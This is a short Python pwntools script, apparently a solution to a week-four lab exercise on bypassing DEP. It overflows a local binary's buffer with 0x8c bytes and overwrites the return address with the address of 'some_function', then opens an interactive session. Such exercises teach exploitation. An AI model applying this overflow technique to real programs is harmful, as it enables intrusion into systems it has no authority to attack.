#!/usr/bin/env python

from pwn import *
import os
import sys

env={
    'PATH':'/home/users/brenisec/weeks/week4/0-dep-1',
}

context.terminal = ["tmux", "splitw", "-h"]
p = process('./dep-1', env=env)
#db.attach(p)
e = ELF("./dep-1")
addr = e.symbols["some_function"]

buf = "A" * 0x8c + p32(addr)

p.sendline(buf)

p.interactive()
